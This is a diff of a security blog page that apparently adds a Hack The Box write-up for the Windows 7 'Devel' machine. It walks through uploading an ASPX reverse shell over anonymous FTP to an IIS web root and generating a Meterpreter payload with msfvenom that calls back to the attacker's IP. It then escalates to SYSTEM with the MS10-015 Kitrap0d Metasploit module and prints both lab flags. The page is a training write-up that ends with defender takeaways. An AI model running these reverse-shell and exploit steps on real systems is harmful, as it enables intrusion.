@@ -6,17 +6,13 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="Write-ups for HTB lab machines — rooted, documented, and understood.">
+        <meta name="description" content="Anonymous FTP exposes the IIS web root directly. Upload an ASPX reverse shell, execute it via HTTP, escalate through an unpatched Windows 7 kernel.">
       
       
         <meta name="author" content="Fudomaru">
       
       
       
-        <link rel="prev" href="../../overthewire/natas/">
-      
-      
-        <link rel="next" href="../twomillion/">
       
       
         
@@ -27,7 +23,7 @@
     
     
       
-        <title>Hack The Box - Digital Dojo</title>
+        <title>Devel - Digital Dojo</title>
       
     
     
@@ -143,7 +139,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#hack-the-box" class="md-skip">
+        <a href="#devel" class="md-skip">
           Skip to content
         </a>
       
@@ -176,7 +172,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Hack The Box
+              Devel
             
           </span>
         </div>
@@ -356,12 +352,10 @@
   
   
   
-    
-  
   
     
     
-      <li class="md-tabs__item md-tabs__item--active">
+      <li class="md-tabs__item">
         <a href="../../overview/" class="md-tabs__link">
           
   
@@ -2795,29 +2789,24 @@
       
   
   
-    
   
   
-  
     
     
     
     
       
-        
-        
-      
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
         
           
-          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
             
   
   
@@ -2835,7 +2824,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5">
             <span class="md-nav__icon md-icon"></span>
             
@@ -2992,8 +2981,6 @@
                 
   
   
-    
-  
   
   
     
@@ -3004,11 +2991,11 @@
       
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5_3" >
         
           
           <label class="md-nav__link" for="__nav_5_3" id="__nav_5_3_label" tabindex="0">
@@ -3029,7 +3016,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_5_3_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_5_3">
             <span class="md-nav__icon md-icon"></span>
             
@@ -3044,37 +3031,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Overview
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../overview/" class="md-nav__link">
         
   
   
@@ -3090,37 +3050,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#machines" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Machines
-      
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -4101,10 +4030,93 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#machines" class="md-nav__link">
+  <a href="#setup" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Machines
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-aspx-reverse-shell-via-ftp-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploitation — ASPX Reverse Shell via FTP Upload
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Privilege Escalation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#system-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        System Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#upgrading-to-a-meterpreter-session" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Upgrading to a Meterpreter Session
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-selection-ms10-015-kitrap0d" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploit Selection — MS10-015 (Kitrap0d)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Flags
       
     </span>
   </a>
@@ -4129,64 +4141,6 @@
   
 
 
-  <nav class="md-path" aria-label="Navigation" >
-    <ol class="md-path__list">
-      
-        
-  
-  
-    <li class="md-path__item">
-      <a href="../../.." class="md-path__link">
-        
-  <span class="md-ellipsis">
-    Home
-  </span>
-
-      </a>
-    </li>
-  
-
-      
-      
-        
-  
-  
-    
-    
-      <li class="md-path__item">
-        <a href="../../overview/" class="md-path__link">
-          
-  <span class="md-ellipsis">
-    Challenges
-  </span>
-
-        </a>
-      </li>
-    
-  
-
-      
-        
-  
-  
-    
-    
-      <li class="md-path__item">
-        <a href="./" class="md-path__link">
-          
-  <span class="md-ellipsis">
-    HTB
-  </span>
-
-        </a>
-      </li>
-    
-  
-
-      
-    </ol>
-  </nav>
-
               
               <article class="md-content__inner md-typeset">
                 
@@ -4194,58 +4148,204 @@
 
 
 
-<h1 id="hack-the-box">Hack The Box</h1>
-<p>HackTheBox is where I take on real lab machines in an isolated environment.
-Each box is a small world of its own —
-a misconfigured service, a forgotten credential, a logic flaw waiting to be pulled apart.</p>
-<p>The write-ups here follow the machine from first scan to root.
-No spoilers skipped, no lucky guesses glossed over.
-If something took me an embarrassing amount of time, that stays in.
-The struggle is the point.</p>
-<hr />
-<h2 id="machines">Machines</h2>
+<h1 id="devel">Devel</h1>
 <table>
 <thead>
 <tr>
-<th>Machine</th>
-<th>Difficulty</th>
-<th>OS</th>
-<th>Status</th>
+<th></th>
+<th></th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="../twomillion/">TwoMillion</a></td>
+<td><strong>Difficulty</strong></td>
 <td>Easy</td>
-<td>Linux</td>
-<td>Completed</td>
 </tr>
 <tr>
-<td><a href="../blue/">Blue</a></td>
-<td>Easy</td>
-<td>Windows</td>
-<td>Completed</td>
+<td><strong>OS</strong></td>
+<td>Windows 7</td>
 </tr>
 <tr>
-<td><a href="../jerry/">Jerry</a></td>
-<td>Easy</td>
-<td>Windows</td>
-<td>Completed</td>
-</tr>
-<tr>
-<td><a href="../netmon/">Netmon</a></td>
-<td>Easy</td>
-<td>Windows</td>
-<td>Completed</td>
-</tr>
-<tr>
-<td><a href="../devel/">Devel</a></td>
-<td>Easy</td>
-<td>Windows</td>
-<td>Completed</td>
+<td><strong>Focus</strong></td>
+<td>Anonymous FTP + IIS web root exposure</td>
 </tr>
 </tbody>
 </table>
+<p>Devel is a box about default configurations left unchanged.
+Two services are running — FTP and IIS — and on their own, neither is catastrophic.
+The problem is how they interact: the FTP root and the IIS web root are the same directory.
+Anonymous write access to FTP means anonymous code execution via the web server.</p>
+<p>The machine is deliberately simple, but the misconfiguration it demonstrates shows up in real environments more than it should.</p>
+<hr />
+<h2 id="setup">Setup</h2>
+<p>Kali VM via QEMU. VPN connected with openvpn.
+If large packets time out, lower the MTU on the tunnel interface:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>ip<span class="w"> </span>link<span class="w"> </span><span class="nb">set</span><span class="w"> </span>tun0<span class="w"> </span>mtu<span class="w"> </span><span class="m">1200</span>
+</code></pre></div>
+<hr />
+<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-vv<span class="w"> </span>-oA<span class="w"> </span>nmap-init<span class="w"> </span><span class="m">10</span>.129.31.137
+</code></pre></div>
+<p><strong>Open ports:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Detail</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+<td>Microsoft ftpd — anonymous login allowed</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>Microsoft IIS 7.5</td>
+</tr>
+</tbody>
+</table>
+<p>TTL 127 confirms Windows. Two services, and they immediately raise a question together.</p>
+<p>The FTP anonymous listing shows:</p>
+<div class="highlight"><pre><span></span><code>03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  05:37PM                  689 iisstart.htm
+03-17-17  05:37PM               184946 welcome.png
+</code></pre></div>
+<p>Those are IIS files — <code>iisstart.htm</code> and <code>welcome.png</code> are the default IIS 7 landing page assets, and <code>aspnet_client</code> is the standard ASP.NET client scripts folder.
+The FTP root and the IIS web root are the same directory.</p>
+<p>Navigating to <code>http://10.129.31.137</code> confirms it — the default IIS 7 splash page loads, serving the same <code>welcome.png</code> sitting in the FTP directory.</p>
+<hr />
+<h2 id="exploitation-aspx-reverse-shell-via-ftp-upload">Exploitation — ASPX Reverse Shell via FTP Upload</h2>
+<p>Since the FTP root and IIS web root are the same directory, any file uploaded via FTP is immediately accessible over HTTP. IIS 7.5 with ASP.NET installed will execute <code>.aspx</code> files server-side rather than serve them as plain text.</p>
+<p>Used a pre-built ASPX reverse shell, uploaded it via anonymous FTP:</p>
+<div class="highlight"><pre><span></span><code>ftp<span class="w"> </span><span class="m">10</span>.129.31.137
+<span class="c1"># user: anonymous</span>
+<span class="c1"># pass: (blank)</span>
+put<span class="w"> </span>shell.aspx
+</code></pre></div>
+<p>Set up a listener:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">1234</span>
+</code></pre></div>
+<p>Navigated to <code>http://10.129.31.137/shell.aspx</code> in the browser to trigger execution.</p>
+<p>The shell connected back:</p>
+<div class="highlight"><pre><span></span><code>connect to [10.10.15.139] from (UNKNOWN) [10.129.31.137] 49164
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>c:\Users&gt; whoami
+iis apppool\web
+</code></pre></div>
+<p>Shell as the IIS application pool identity — a low-privileged service account.
+The user flag is not readable from this context. Privilege escalation needed.</p>
+<hr />
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="system-reconnaissance">System Reconnaissance</h3>
+<div class="highlight"><pre><span></span><code>systeminfo
+</code></pre></div>
+<p>Key findings:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Windows 7 Enterprise</td>
+</tr>
+<tr>
+<td>Build</td>
+<td>6.1.7600 (RTM — no service pack)</td>
+</tr>
+<tr>
+<td>Architecture</td>
+<td>X86-based PC</td>
+</tr>
+<tr>
+<td>Hotfixes</td>
+<td><strong>N/A</strong></td>
+</tr>
+<tr>
+<td>Owner</td>
+<td>babis</td>
+</tr>
+</tbody>
+</table>
+<p><code>Hotfix(s): N/A</code> means zero patches have ever been applied to this machine.
+Windows 7 RTM was released in 2009 — every local privilege escalation discovered in the years since is potentially on the table.
+The architecture is x86, which matters for exploit compatibility.</p>
+<h3 id="upgrading-to-a-meterpreter-session">Upgrading to a Meterpreter Session</h3>
+<p>The netcat shell works for exploration but Metasploit's local exploit modules require a Meterpreter session.
+Uploading a compiled <code>.exe</code> payload failed — the server accepted the transfer but the files landed as 0 bytes, indicating the server was stripping PE executables on write.</p>
+<p>The fix: generate the Meterpreter payload as an <code>.aspx</code> file instead. IIS executes it as a web application, bypassing whatever was stripping standalone binaries.</p>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.15.139<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>aspx<span class="w"> </span>-o<span class="w"> </span>rshell.aspx
+</code></pre></div>
+<p>Upload via FTP (binary mode):</p>
+<div class="highlight"><pre><span></span><code>ftp<span class="w"> </span><span class="m">10</span>.129.31.137
+binary
+put<span class="w"> </span>rshell.aspx
+</code></pre></div>
+<p>Set up the handler:</p>
+<div class="highlight"><pre><span></span><code>msfconsole
+use<span class="w"> </span>exploit/multi/handler
+<span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span>tun0
+<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+run
+</code></pre></div>
+<p>Triggered execution by navigating to <code>http://10.129.31.137/rshell.aspx</code> in the browser.</p>
+<div class="highlight"><pre><span></span><code>[*] Sending stage (199238 bytes) to 10.129.31.137
+[*] Meterpreter session 2 opened (10.10.15.139:4444 -&gt; 10.129.31.137:49182)
+</code></pre></div>
+<h3 id="exploit-selection-ms10-015-kitrap0d">Exploit Selection — MS10-015 (Kitrap0d)</h3>
+<p>The <code>local_exploit_suggester</code> module crashed with a Ruby <code>NameError</code> — a known Metasploit bug, not a target issue.</p>
+<p>With the OS version and patch level known (Windows 7 RTM, x86, no hotfixes), searching for applicable local privilege escalation exploits points quickly to MS10-015. Metasploit has a reliable module for it:</p>
+<div class="highlight"><pre><span></span><code>use exploit/windows/local/ms10_015_kitrap0d
+set SESSION 2
+set LHOST 10.10.15.139
+set LPORT 4449
+run
+</code></pre></div>
+<p>MS10-015 (Kitrap0d) is a privilege escalation vulnerability in the Windows kernel's Virtual DOS Machine (VDM) subsystem — present in every 32-bit Windows from 2000 through 7. It injects a payload into a spawned <code>netsh.exe</code> process and exploits the VDM to execute it as SYSTEM.</p>
+<div class="highlight"><pre><span></span><code>[*] Reflectively injecting payload and triggering the bug...
+[*] Launching netsh to host the DLL...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Meterpreter session 3 opened (10.10.15.139:4449 -&gt; 10.129.31.137:49183)
+</code></pre></div>
+<p>Dropped into a shell and confirmed:</p>
+<div class="highlight"><pre><span></span><code>c:\Users\babis&gt; whoami
+nt authority\system
+</code></pre></div>
+<p>SYSTEM. Both flags are now readable.</p>
+<hr />
+<h2 id="flags">Flags</h2>
+<div class="highlight"><pre><span></span><code>c:\Users\babis\Desktop&gt; type user.txt
+55dc79700b81f2bb9736dc6be88d2d9e
+</code></pre></div>
+<!-- 55dc79700b81f2bb9736dc6be88d2d9e -->
+
+<p><strong>User flag captured.</strong></p>
+<div class="highlight"><pre><span></span><code>c:\Users\Administrator\Desktop&gt; type root.txt
+0ab10396cc43e24187b22e11110788df
+</code></pre></div>
+<!-- 0ab10396cc43e24187b22e11110788df -->
+
+<p><strong>Root flag captured. Box complete.</strong></p>
+<hr />
+<div class="admonition example">
+<p class="admonition-title">Conclusion</p>
+<p>The entry point is a misconfiguration so simple it almost feels unfair: FTP anonymous write access to the IIS web root. Neither service is broken on its own — FTP anonymous access has legitimate uses, and IIS running on port 80 is unremarkable. The danger is the combination. Any file you can upload, the web server will serve. Any <code>.aspx</code> file it serves, it will execute. That's code execution without a single credential.</p>
+<p>The exe-stripping issue was a useful lesson. Whatever was zeroing out uploaded <code>.exe</code> files had no opinion about <code>.aspx</code> files — because those are served by the web application layer, not executed as PE binaries. Switching the payload format entirely bypassed the filter without needing to encode or obfuscate anything.</p>
+<p>The privilege escalation is almost mechanical on a fully unpatched Windows 7 x86 box. <code>Hotfix(s): N/A</code> is one of the clearest signals in pentesting — it means every public local exploit from that OS version's entire lifecycle is potentially valid. MS10-015 covers Windows 2000 through 7, works on x86, and has a reliable Metasploit module. On a box with no patches at all, the harder question is which exploit to pick first, not whether one exists.</p>
+<p>Defender takeaways: FTP anonymous write access should never point at a web root. The IIS application pool should run under a restricted service account, not one that can be leveraged to reach SYSTEM through an unpatched kernel. And patch management is not optional — a box that has never received a single hotfix will fall to the first public exploit that matches its architecture.</p>
+</div>
 
 
 
@@ -4279,44 +4379,6 @@ The struggle is the point.</p>
       
         <footer class="md-footer">
   
-    
-      
-      <nav class="md-footer__inner md-grid" aria-label="Footer" >
-        
-          
-          <a href="../../overthewire/natas/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Natas">
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
-            </div>
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Previous
-              </span>
-              <div class="md-ellipsis">
-                Natas
-              </div>
-            </div>
-          </a>
-        
-        
-          
-          <a href="../twomillion/" class="md-footer__link md-footer__link--next" aria-label="Next: TwoMillion">
-            <div class="md-footer__title">
-              <span class="md-footer__direction">
-                Next
-              </span>
-              <div class="md-ellipsis">
-                TwoMillion
-              </div>
-            </div>
-            <div class="md-footer__button md-icon">
-              
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
-            </div>
-          </a>
-        
-      </nav>
     
   
   <div class="md-footer-meta md-typeset">
